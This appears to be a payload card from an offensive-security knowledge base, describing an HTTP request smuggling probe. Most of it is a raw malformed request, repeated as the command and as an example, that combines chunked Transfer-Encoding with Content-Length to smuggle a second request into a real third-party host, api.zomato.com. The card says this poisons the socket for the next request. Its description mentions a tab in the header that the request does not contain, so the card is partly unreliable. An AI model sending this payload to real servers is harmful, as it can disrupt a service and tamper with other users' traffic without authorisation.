---
data: |-
  DELETE / HTTP/1.1
  Transfer-Encoding: chunked
  Host: api.zomato.com
  Content-Length: 51
  User-Agent: Treasure/6.7
  0

  GET /some/other/endpoint HTTP/1.1
  X-Ignore: X[STOP]
tags:
  - http-smuggling
type: command
executor: http
platforms:
  - Web
id: c7afbe15-b198-42b8-a47c-17f045123b65
created_at: '2025-12-13T09:01:26.147Z'
updated_at: '2025-12-13T09:01:26.147Z'
verified: false
validated: true
submitted: true
---
# HTTP Smuggling Discovery Payload

## Command

```http
DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 51
User-Agent: Treasure/6.7
0

GET /some/other/endpoint HTTP/1.1
X-Ignore: X[STOP]
```

## Description

This command tests for HTTP Request Smuggling by sending a malformed Transfer-Encoding header with a tab to cause desync between servers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Host` | Targets api.zomato.com | Yes |
| `Content-Length` | Sets request size to 51 for frontend | Yes |
| `Transfer-Encoding` | Chunked with tab for desync | Yes |

## Examples

### Basic Usage

```http
DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 51
User-Agent: Treasure/6.7
0

GET /some/other/endpoint HTTP/1.1
X-Ignore: X[STOP]
```

## Expected Output

No direct output; poisons socket for next request, observable via altered responses.

## Related

- [[procedures/Discover-HTTP-Request-Smuggling-Vulnerability]]
